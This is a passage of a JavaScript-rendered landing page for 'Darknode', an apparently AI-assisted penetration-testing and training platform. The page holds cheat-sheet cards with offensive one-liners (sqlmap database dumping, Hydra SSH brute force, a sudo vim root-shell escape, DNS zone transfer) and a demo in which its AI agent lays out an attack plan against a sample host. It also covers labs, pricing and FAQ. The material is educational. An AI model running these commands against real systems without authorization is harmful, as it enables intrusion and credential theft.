                <span class="sev critical">Critical</span>
              </div>
              <p>Automated SQL injection and database takeover. Detects injection points, dumps databases, reads files, and can establish OS-level shells on vulnerable targets.</p>
              <div class="rag-code"><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Gobuster Directory Brute-force</h4>
                <span class="sev medium">Medium</span>
              </div>
              <p>High-speed directory and file enumeration using wordlists. Discovers hidden admin panels, backup files, API endpoints, and configuration files.</p>
              <div class="rag-code"><code>gobuster dir -u http://target -w /usr/share/wordlists/common.txt</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Hydra Password Attack</h4>
                <span class="sev high">High</span>
              </div>
              <p>Online password brute-forcer supporting 50+ protocols. Tests credential pairs against SSH, FTP, HTTP forms, databases, and other network services.</p>
              <div class="rag-code"><code>hydra -l admin -P rockyou.txt ssh://10.10.14.7</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="privesc">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>SUID Binary Exploitation</h4>
                <span class="sev critical">Critical</span>
              </div>
              <p>Finding binaries with the SUID bit set that can be abused to escalate from a low-privilege user to root. Common targets include custom scripts and misconfigured system utilities.</p>
              <div class="rag-code"><code>find / -perm -4000 -type f 2>/dev/null</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Sudo Misconfigurations</h4>
                <span class="sev critical">Critical</span>
              </div>
              <p>Exploiting overly permissive sudo rules. Users allowed to run specific binaries as root without password can often spawn a shell through those binaries.</p>
              <div class="rag-code"><code>sudo -l\nsudo vim -c ':!/bin/bash'</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Cron Job Hijacking</h4>
                <span class="sev high">High</span>
              </div>
              <p>Identifying writable scripts executed by root cron jobs. Replacing or appending to these scripts grants code execution as root on the next scheduled run.</p>
              <div class="rag-code"><code>cat /etc/crontab\nls -la /var/spool/cron/</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="recon">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Subdomain Enumeration</h4>
                <span class="sev medium">Medium</span>
              </div>
              <p>Discovering hidden subdomains through DNS brute-forcing, certificate transparency logs, and passive OSINT sources. Expands the attack surface significantly.</p>
              <div class="rag-code"><code>subfinder -d target.com -silent | httpx -title -status-code</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>DNS Zone Transfer</h4>
                <span class="sev high">High</span>
              </div>
              <p>Attempting AXFR requests against misconfigured DNS servers. A successful transfer reveals every record in the zone -- hosts, mail servers, internal infrastructure.</p>
              <div class="rag-code"><code>dig axfr @ns1.target.com target.com</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>SMB Enumeration</h4>
                <span class="sev high">High</span>
              </div>
              <p>Enumerating Windows shares, users, and groups through the SMB protocol. Discovers open shares, null sessions, and credentials stored in accessible file shares.</p>
              <div class="rag-code"><code>enum4linux -a 10.10.14.7\nsmbclient -L //10.10.14.7 -N</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h4>Web Technology Fingerprinting</h4>
                <span class="sev medium">Medium</span>
              </div>
              <p>Identifying frameworks, CMS platforms, server software, and client-side libraries. Guides exploit selection by revealing the exact technology stack in use.</p>
              <div class="rag-code"><code>whatweb http://target.com -v\nwappalyzer http://target.com</code></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRACTICE LABS ====== -->
    <section class="section" id="labs" aria-labelledby="labs-title">
      <div class="wrap">
        <div class="sec-label">Hands-on training</div>
        <h2 class="sec-title" id="labs-title">Practice on real vulnerable apps</h2>
        <p class="sec-sub">Spin up intentionally vulnerable environments and break them legally. Reset anytime. Learn by exploiting real flaws.</p>
        <div class="plab-grid">
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">DVWA</h3>
            <p class="plab-desc">Damn Vulnerable Web App &mdash; SQLi, XSS, CSRF, file upload, command injection. The classic training ground.</p>
            <span class="plab-diff beginner">Beginner</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">Juice Shop</h3>
            <p class="plab-desc">OWASP modern web app with 100+ challenges across injection, broken auth, XSS, and insecure deserialization.</p>
            <span class="plab-diff beginner">Beginner</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">WebGoat</h3>
            <p class="plab-desc">OWASP guided lessons covering A1&ndash;A10 vulnerabilities with built-in hints and explanations.</p>
            <span class="plab-diff beginner">Beginner</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">VM</span>
            </div>
            <h3 class="plab-name">Metasploitable</h3>
            <p class="plab-desc">Intentionally vulnerable Linux VM. Practice network enumeration, privilege escalation, and exploit chains.</p>
            <span class="plab-diff intermediate">Intermediate</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">VM</span>
            </div>
            <h3 class="plab-name">VulnHub machines</h3>
            <p class="plab-desc">50+ downloadable VMs with varying difficulty. Full boot-to-root practice for OSCP-style methodology.</p>
            <span class="plab-diff intermediate">Intermediate</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Browser</span>
            </div>
            <h3 class="plab-name">HackTheBox-style challenges</h3>
            <p class="plab-desc">CTF-format exercises covering cryptography, reverse engineering, forensics, and web exploitation.</p>
            <span class="plab-diff advanced">Advanced</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Adapter required</span>
            </div>
            <h3 class="plab-name">Wireless lab</h3>
            <p class="plab-desc">WiFi security testing &mdash; WPA/WPA2 cracking, evil twin attacks, and wireless reconnaissance.</p>
            <span class="plab-diff advanced">Advanced</span>
          </div>
          <div class="plab-card">
            <div class="plab-top">
              <span class="plab-status"></span>
              <span class="plab-runtime">Docker</span>
            </div>
            <h3 class="plab-name">API security lab</h3>
            <p class="plab-desc">REST and GraphQL vulnerability practice &mdash; broken auth, BOLA, injection, rate limiting, and SSRF.</p>
            <span class="plab-diff intermediate">Intermediate</span>
          </div>
        </div>
        <p class="plab-note">All labs run locally in Docker or VirtualBox. Nothing touches the internet.</p>
      </div>
    </section>

    <!-- ====== SEE IT IN ACTION ====== -->
    <section class="section" id="demo" aria-labelledby="demo-title">
      <div class="wrap">
        <div class="sec-label">See it in action</div>
        <h2 class="sec-title" id="demo-title">From recon to report in one workflow</h2>
        <p class="sec-sub">Four steps. One tool. Watch Darknode and Nexus AI take a target from unknown to fully documented.</p>
        <div class="showcase-tabs" role="tablist" aria-label="Demo tabs">
          <button class="showcase-tab active" role="tab" aria-selected="true" aria-controls="stab-recon" id="tab-recon" data-tab="recon">Recon scan</button>
          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-analysis" id="tab-analysis" data-tab="analysis">AI analysis</button>
          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-exploit" id="tab-exploit" data-tab="exploit">Exploit guidance</button>
          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-report" id="tab-report" data-tab="report">Report generation</button>
        </div>
        <div class="showcase-window">
          <div class="term-window showcase-term">
            <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title" id="showcase-tw-title">darknode</span></div>
            <pre class="tw-body" id="showcase-body" aria-live="polite"><span class="showcase-panel" id="stab-recon" role="tabpanel" aria-labelledby="tab-recon"><span class="c-pl">$</span> darknode scan 10.10.14.7

<span class="c-mut">[*] Starting Darknode scan against 10.10.14.7</span>
<span class="c-mut">[*] Running service detection on all ports...</span>

<span class="c-ok">PORT    STATE  SERVICE       VERSION</span>
<span class="c-ok">22</span>      open   ssh           OpenSSH 8.9p1 Ubuntu
<span class="c-ok">80</span>      open   http          Apache httpd 2.4.52
<span class="c-ok">443</span>     open   https         Apache httpd 2.4.52
<span class="c-ok">3306</span>    open   mysql         MySQL 5.7.38
<span class="c-ok">8080</span>    open   http-proxy    Jetty 9.4.43

<span class="c-acc">[+] 5 open ports found on 10.10.14.7</span>
<span class="c-mut">[*] OS detection: Linux 5.x (96% confidence)</span>
<span class="c-mut">[*] Scan completed in 14.2s</span>
<span class="c-acc">[+] Results saved to ./scans/10.10.14.7.json</span></span><span class="showcase-panel" id="stab-analysis" role="tabpanel" aria-labelledby="tab-analysis" hidden><span class="c-pl">$</span> darknode nexus "analyze the scan results for vulnerabilities"

<span class="c-acc">Nexus:</span> Analyzing scan output for 10.10.14.7...

<span class="c-ok">CRITICAL FINDINGS:</span>

<span class="c-bad">1. MySQL 5.7.38 (port 3306)</span>
   End-of-life version. Multiple known CVEs including
   CVE-2023-21977 (privilege escalation) and
   CVE-2022-21515 (denial of service).
   Publicly exposed on a non-standard config.

<span class="c-bad">2. Apache 2.4.52 (ports 80, 443)</span>
   Vulnerable to CVE-2022-31813 (mod_proxy bypass)
   and CVE-2022-28615 (out-of-bounds read).
   Recommend upgrade to 2.4.58+.

<span class="c-pl">3. Jetty 9.4.43 (port 8080)</span>
   Check for CVE-2023-26048 (multipart DoS).
   Often fronts Jenkins, Nexus, or Solr instances.

<span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-exploit" role="tabpanel" aria-labelledby="tab-exploit" hidden><span class="c-pl">$</span> darknode nexus "suggest exploitation approach"

<span class="c-acc">Nexus:</span> Based on the findings, here is a recommended
attack methodology for 10.10.14.7:

<span class="c-ok">PHASE 1 -- Enumeration</span>
  <span class="c-pl">></span> Enumerate Apache vhosts and directories
    <span class="c-mut">$ darknode gobuster 10.10.14.7</span>
  <span class="c-pl">></span> Check Jetty 8080 for admin panels
    <span class="c-mut">$ darknode probe http://10.10.14.7:8080</span>

<span class="c-ok">PHASE 2 -- Exploitation</span>
  <span class="c-pl">></span> Test MySQL for default/weak credentials
    <span class="c-mut">$ darknode hydra mysql://10.10.14.7</span>
  <span class="c-pl">></span> Attempt mod_proxy SSRF via CVE-2022-31813
  <span class="c-pl">></span> Probe Jetty for unauthenticated endpoints

<span class="c-ok">PHASE 3 -- Post-exploitation</span>
  <span class="c-pl">></span> If MySQL access: dump credentials, pivot
  <span class="c-pl">></span> If web shell: escalate via kernel 5.x exploits

<span class="c-mut">engine: ollama/llama3 (local, free)</span></span><span class="showcase-panel" id="stab-report" role="tabpanel" aria-labelledby="tab-report" hidden><span class="c-pl">$</span> darknode report --target 10.10.14.7

<span class="c-mut">[*] Generating penetration test report...</span>
<span class="c-mut">[*] Compiling scan data, findings, and recommendations</span>

<span class="c-acc">====================================</span>
<span class="c-acc">  PENETRATION TEST REPORT</span>
<span class="c-acc">  Target: 10.10.14.7</span>
<span class="c-acc">  Date:   2026-09-07</span>
<span class="c-acc">  Risk:   <span class="c-bad">HIGH</span></span>
<span class="c-acc">====================================</span>

  Executive Summary:
  5 services identified. 2 critical vulnerabilities
  found in MySQL and Apache. Immediate patching
  recommended. MySQL instance should not be
  publicly accessible.

  <span class="c-ok">Findings:  3 critical, 1 medium, 1 info</span>
  <span class="c-ok">Pages:     12</span>
  <span class="c-ok">Format:    PDF + Markdown</span>

<span class="c-acc">[+] Report saved to ./reports/10.10.14.7.pdf</span>
<span class="c-acc">[+] Markdown copy: ./reports/10.10.14.7.md</span>
<span class="c-mut">[*] Done in 3.8s</span></span></pre>
          </div>
        </div>
        <div class="showcase-hint">
          <span class="showcase-step-dots">
            <span class="showcase-dot active" data-tab="recon"></span>
            <span class="showcase-dot" data-tab="analysis"></span>
            <span class="showcase-dot" data-tab="exploit"></span>
            <span class="showcase-dot" data-tab="report"></span>
          </span>
        </div>
      </div>
    </section>

    <!-- ====== SOURCE AVAILABLE ====== -->
    <section class="section" id="open-source">
      <div class="wrap" style="text-align:center">
        <div class="sec-label">Source available</div>
        <h2 class="sec-title">Built in the open</h2>
        <p class="sec-sub">Every line of code is on GitHub. Read it, study it, learn from it.</p>
        <div class="gh-cards">
          <a class="gh-card" href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">
            <span class="gh-name">darknode-cli</span>
            <span class="gh-desc">Terminal security toolkit + Nexus AI</span>
          </a>
          <a class="gh-card" href="${GITHUB}/darknode-os" target="_blank" rel="noopener">
            <span class="gh-name">darknode-os</span>
            <span class="gh-desc">Custom Linux security workstation</span>
          </a>
          <a class="gh-card" href="${GITHUB}/nexus" target="_blank" rel="noopener">
            <span class="gh-name">nexus</span>
            <span class="gh-desc">AI agent engine — 52 modules</span>
          </a>
        </div>
      </div>
    </section>

    <!-- ====== TESTIMONIALS ====== -->
    <section class="section alt" id="testimonials" aria-labelledby="testimonials-title">
      <div class="wrap">
        <div class="sec-label">Social proof</div>
        <h2 class="sec-title" id="testimonials-title">Trusted by security professionals</h2>
        <p class="sec-sub">From students to red team leads, here is what people are saying about Darknode.</p>
        <div class="testimonial-grid">
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">Finally a security platform that runs entirely on my machine. No cloud lock-in.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Security Engineer</div>
              <div class="testimonial-org">Enterprise Security</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">The AI agent found a misconfigured S3 bucket in our staging environment within minutes.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">DevOps Lead</div>
              <div class="testimonial-org">Cloud Infrastructure</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">I passed my OSCP using Darknode's practice labs and AI-guided methodology.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Pentester</div>
              <div class="testimonial-org">Offensive Security</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">The cheat sheets alone saved me hours. Having the AI explain each technique is next level.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">CS Student</div>
              <div class="testimonial-org">University</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">We replaced three commercial tools with Darknode. The fact that it's free is unreal.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Red Team Lead</div>
              <div class="testimonial-org">Security Consulting</div>
            </div>
          </div>
          <div class="testimonial-card">
            <div class="testimonial-quote">&ldquo;</div>
            <blockquote class="testimonial-text">The Nexus AI agent writes better Nuclei templates than most of my team.</blockquote>
            <div class="testimonial-author">
              <div class="testimonial-role">Security Researcher</div>
              <div class="testimonial-org">Vulnerability Research</div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRICING ====== -->
    <section class="section alt" id="pricing" aria-labelledby="pricing-title">
      <div class="wrap">
        <div class="sec-label">Pricing</div>
        <h2 class="sec-title" id="pricing-title">Free to start. Upgrade when you're ready.</h2>
        <p class="sec-sub">Bring your own AI key on any plan. Paid plans unlock platform features, not AI access.</p>
        <div class="pricing-grid">
          <div class="price-card">
            <div class="price-tier">Free</div>
            <div class="price-amount">$0<span class="price-period">/forever</span></div>
            <p class="price-desc">Everything you need to start learning.</p>
            <ul class="price-features">
              <li>GPT-OSS 120B local AI (runs on your device, free)</li>
              <li>BYOK &mdash; bring your own Claude, GPT, or Gemini API key</li>
              <li>192+ security tools &amp; cheat sheets</li>
              <li>Practice labs (DVWA, Juice Shop, WebGoat)</li>
              <li>Nexus AI agent &mdash; core features</li>
              <li>Security RAG &mdash; built-in OWASP, CVEs, attack patterns</li>
              <li>Web shell with Ollama integration</li>
              <li>CLI &amp; desktop app (free forever)</li>
              <li>5 MCP server integrations</li>
              <li>Community support</li>
            </ul>
            <button class="btn lg" id="price-free">Get started free</button>
          </div>
          <div class="price-card featured">
            <div class="price-badge">Recommended</div>
            <div class="price-tier">Pro</div>
            <div class="price-amount">$12<span class="price-period">/month</span></div>
            <p class="price-desc">Advanced platform features for serious learners.</p>
            <ul class="price-features">
              <li>Everything in Free, plus:</li>
              <li class="feat-section">Platform features (darknode.ai)</li>
              <li>Multi-agent pipelines (8 roles)</li>
              <li>Ghost Agents &mdash; background monitoring</li>
              <li>Thought Stream &mdash; visible AI reasoning</li>
              <li>Attack Planner &mdash; AI pentest methodology</li>
              <li>CTF Assistant &mdash; guided challenge solving</li>
              <li>Threat Modeler &mdash; STRIDE analysis</li>
              <li>Vulnerability Scanner &mdash; headers &amp; misconfigs</li>
              <li>Code Radar &mdash; codebase security analysis</li>
              <li>Smart Test Generator</li>
              <li class="feat-section">Downloadable extras</li>
              <li>Darknode OS &mdash; pre-built security VM</li>
              <li>Premium wordlists &amp; payload collections</li>
              <li>Pre-configured Nuclei &amp; Nmap scan profiles</li>
              <li>25 MCP server integrations</li>
              <li>Early access to new features</li>
            </ul>
            <button class="btn lg glow" id="price-pro" disabled>Coming soon</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Team</div>
            <div class="price-amount">$25<span class="price-period">/month</span></div>
            <p class="price-desc">Collaborate, compete, and train together.</p>
            <ul class="price-features">
              <li>Everything in Pro, plus:</li>
              <li class="feat-section">Platform features (darknode.ai)</li>
              <li>Skill Forge &mdash; AI creates its own tools</li>
              <li>World Model &mdash; simulate before acting</li>
              <li>Deep Memory &mdash; 3-tier cognitive architecture</li>
              <li>Time Travel &mdash; undo any action, any time</li>
              <li>Shared workspace &amp; team labs</li>
              <li>Custom training scenarios &amp; CTF builder</li>
              <li>Report Generator &mdash; professional pentest reports</li>
              <li>Full STRIDE threat modeling &amp; OWASP compliance</li>
              <li class="feat-section">Downloadable extras</li>
              <li>Report templates (.docx, .pdf) with your branding</li>
              <li>Extended Darknode OS with team tools</li>
              <li>Plugin system &amp; extension SDK</li>
              <li>Unlimited MCP integrations</li>
              <li>Shared saved scans &amp; findings across team</li>
            </ul>
            <button class="btn lg" id="price-team" disabled>Coming soon</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Enterprise</div>
            <div class="price-amount">Custom</div>
            <p class="price-desc">For organizations that need control and compliance.</p>
            <ul class="price-features">
              <li>Everything in Team, plus:</li>
              <li class="feat-section">Enterprise platform</li>
              <li>SSO &amp; SAML authentication</li>
              <li>Data isolation &amp; tenant separation</li>
              <li>Custom compliance frameworks</li>
              <li>Admin dashboard &amp; usage analytics</li>
              <li>Role-based access control</li>
              <li class="feat-section">Downloadable extras</li>
              <li>Org-branded Darknode OS builds</li>
              <li>Custom AI model profiles &amp; fine-tuning</li>
              <li>Self-hosted deployment option</li>
              <li>Audit logging &amp; compliance exports</li>
              <li>Volume licensing</li>
            </ul>
            <button class="btn lg" id="price-enterprise" disabled>Coming soon</button>
          </div>
        </div>
        <p class="pricing-note">All plans include BYOK &mdash; bring your own Claude, GPT, or Gemini API key. The CLI and desktop app are <strong>free forever</strong>. Paid plans unlock <strong>platform features on darknode.ai</strong> + downloadable extras. You never pay us for AI tokens.</p>
      </div>
    </section>

    <!-- ====== FAQ ====== -->
    <section class="section" id="faq" aria-labelledby="faq-title">
      <div class="wrap">
        <div class="sec-label">FAQ</div>
        <h2 class="sec-title" id="faq-title">Frequently asked questions</h2>
        <div class="faq-list">

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Is Darknode really free?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes, the CLI, desktop app, and core platform are free forever. We never charge for AI tokens &mdash; bring your own key or use free local models. Paid plans unlock advanced platform features and downloadable extras.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Does my data leave my computer?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">No. Darknode runs 100% locally. The AI uses models on your machine (via Ollama). If you bring a cloud API key, queries go to that provider &mdash; but we never see or store your data.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">What AI models does Darknode support?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">GPT-OSS 120B (free, local), Claude (Anthropic), GPT-4 (OpenAI), Gemini (Google), and any Ollama-compatible model. Bring your own API key on any plan.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Is this legal to use?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. Darknode is a learning platform for authorized security testing. Practice labs run locally in Docker. Always get written permission before testing systems you don't own.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">How is this different from Kali Linux?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Kali gives you tools. Darknode gives you tools + an AI agent that explains what they do, writes commands for you, and guides you through methodologies.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I use this for real penetration tests?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. The report generator, scan profiles, and methodology guides are designed for professional engagements. Always follow your engagement scope and rules.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">What are the system requirements?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Node.js 18+ for the CLI. For local AI: 16GB RAM minimum (32GB recommended for GPT-OSS 120B). Any modern browser for the web platform.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">How do paid plans work?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Paid plans unlock features on darknode.ai (the web platform). The CLI stays free. Premium downloads (VMs, wordlists, scan profiles) require an active subscription.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I contribute or modify the code?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">The source code is public for learning and reference. See the LICENSE file &mdash; copying, forking, or redistribution is not permitted.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Where can I get help?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">GitHub Issues for bug reports. The <code>/docs</code> command in Nexus has built-in documentation. The AI assistant can answer most questions about the platform.</div>
            </div>
          </div>

        </div>
      </div>
    </section>

    <!-- ====== CTA ====== -->
    <section class="cta-final">
      <div class="cta-mesh"></div>
      <div class="cta-grid-bg"></div>
      <div class="wrap cta-inner">
        <h2>Start learning security today.</h2>
        <p class="cta-sub">Free. Private. Runs on your machine. No catch.</p>
        <button class="btn lg glow" id="cta-signup">Get started &rarr;</button>
        <div class="cta-divider"></div>
        <div class="cta-notify">
          <h3 class="cta-notify-h">Get notified when Pro launches</h3>
          <form class="cta-form" id="cta-notify-form" autocomplete="off">
            <input type="email" class="cta-email" id="cta-email" placeholder="you@example.com" required aria-label="Email address">
            <button type="submit" class="btn lg" id="cta-notify-btn">Notify me</button>
          </form>
          <p class="cta-reassure" id="cta-reassure">No spam. One email when we launch.</p>
        </div>
      </div>
    </section>

    <!-- no footer on landing -->

    <!-- Back to top -->
    <button class="btt" id="btt" aria-label="Back to top" title="Back to top">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="18 15 12 9 6 15"/></svg>
    </button>`;

  const $ = (id) => view.querySelector("#" + id);
  $("cta-start").onclick = actions.onGetStarted;
  $("cta-signup").onclick = actions.onGetStarted;
  if ($("price-free")) $("price-free").onclick = actions.onGetStarted;
  if ($("price-pro")) $("price-pro").onclick = actions.onGetStarted;
  if ($("price-team")) $("price-team").onclick = actions.onGetStarted;

  // Animated counter for hero stats — scroll-triggered with easing
  const counterEls = view.querySelectorAll("[data-count]");
  function formatNum(n, fmt) { return fmt === "comma" ? n.toLocaleString("en-US") : String(n); }
  function animateCounter(el) {
    if (el._counted) return;
    el._counted = true;
    const target = parseInt(el.dataset.count);
    const suffix = el.dataset.suffix || "";
    const fmt = el.dataset.format || "";
    const duration = 1500;
    const start = performance.now();
    function tick(now) {
      const t = Math.min((now - start) / duration, 1);
      const ease = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = Math.round(ease * target);
      el.textContent = formatNum(current, fmt) + suffix;
      if (t < 1) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
  }
  if ("IntersectionObserver" in window) {
    const counterIO = new IntersectionObserver((entries) => {
      entries.forEach(e => { if (e.isIntersecting) { animateCounter(e.target); counterIO.unobserve(e.target); } });
    }, { threshold: 0.3 });
    counterEls.forEach(el => counterIO.observe(el));
  } else {
    counterEls.forEach(el => animateCounter(el));
  }

  // Hero text rotation
  const words = ["cybersecurity", "ethical hacking", "pentesting", "threat analysis", "red teaming"];
  let wordIdx = 0;
  const rotateEl = $("hero-rotate");
  if (rotateEl) {
    const wrap = rotateEl.parentElement;
    if (wrap) {
      let maxW = 0;
      const orig = rotateEl.textContent;
      for (const w of words) { rotateEl.textContent = w; maxW = Math.max(maxW, rotateEl.offsetWidth); }
      rotateEl.textContent = orig;
      wrap.style.minWidth = maxW + "px";
    }
    setInterval(() => {
      wordIdx = (wordIdx + 1) % words.length;
      rotateEl.style.opacity = "0";
      rotateEl.style.transform = "translateY(-8px)";
      setTimeout(() => {
        rotateEl.style.transition = "none";
        rotateEl.style.transform = "translateY(8px)";
        rotateEl.textContent = words[wordIdx];
        requestAnimationFrame(() => {
          rotateEl.style.transition = "opacity .25s,transform .25s";
          rotateEl.style.opacity = "1";
          rotateEl.style.transform = "translateY(0)";
        });
      }, 250);
    }, 3000);
  }

  // Scroll reveal -- staggered section-level reveal for premium cascading feel.
  // When a section scrolls into view, all its reveal-target children fade in
  // with incremental delays (each child +0.07s after the previous, capped at 0.42s).
  if ("IntersectionObserver" in window) {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    const REVEAL_SEL = ".sec-label,.sec-title,.sec-sub,.bento-card,.price-card,.feature-row,.tlv-step,.nx-card,.gh-card,.pricing-note,.nx-details,.hero-trust,.hero-built-with,.testimonial-card,.faq-item,.cmp-landing,.ts-card,.ts-tabs,.nx-arch-layer,.nx-hl,.nx-arch,.metric-card,.rag-tabs,.rag-card,.showcase-tabs,.showcase-window,.showcase-hint,.plab-card,.plab-note";
    if (!reduce) {
      const sectionIO = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (!entry.isIntersecting) return;
          sectionIO.unobserve(entry.target);
          const children = entry.target.querySelectorAll(REVEAL_SEL);
          children.forEach((child, i) => {
            child.style.transitionDelay = Math.min(i * 0.07, 0.42) + "s";
          });
          // rAF ensures transition-delay is applied before class triggers transition
          requestAnimationFrame(() => {
            children.forEach(child => child.classList.add("revealed"));
            // cta-final itself is a reveal target (no children in REVEAL_SEL)
            if (entry.target.matches(".cta-final")) {
              entry.target.classList.add("revealed");
            }
          });
        });
      }, { threshold: 0.08, rootMargin: "0px 0px -40px 0px" });
      view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => sectionIO.observe(sec));
      // Fallback: reveal anything already visible, and reveal all after 3s max
      setTimeout(() => { view.querySelectorAll(REVEAL_SEL).forEach(el => { if (el.getBoundingClientRect().top < window.innerHeight + 200) el.classList.add("revealed"); }); }, 300);
      setTimeout(() => { view.querySelectorAll(REVEAL_SEL).forEach(el => el.classList.add("revealed")); }, 3000);
    } else {
      // Reduced motion: make everything visible immediately, no transitions
      view.querySelectorAll(REVEAL_SEL + ",.cta-final").forEach(el => el.classList.add("revealed"));
    }
  }

  // Parallax gradient shift on .section.alt backgrounds
  (function() {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    if (reduce) return;
    const altSections = view.querySelectorAll(".section.alt");
    if (!altSections.length) return;
    let ticking = false;
    function updateParallax() {
      const vh = window.innerHeight;
      altSections.forEach(function(sec) {
        const rect = sec.getBoundingClientRect();
        const progress = (vh - rect.top) / (vh + rect.height);
        const clamped = Math.max(0, Math.min(1, progress));
        const x = (clamped - 0.5) * 80;
        const y = (clamped - 0.5) * 60;
        sec.style.setProperty("--px-x", x + "px");
        sec.style.setProperty("--px-y", y + "px");
      });
      ticking = false;
    }
    window.addEventListener("scroll", function() {
      if (!ticking) { ticking = true; requestAnimationFrame(updateParallax); }
    }, { passive: true });
    updateParallax();
  })();

  // Smooth scroll for anchor links within the landing page
  view.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener("click", (e) => {
      const target = view.querySelector(link.getAttribute("href"));
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    });
  });

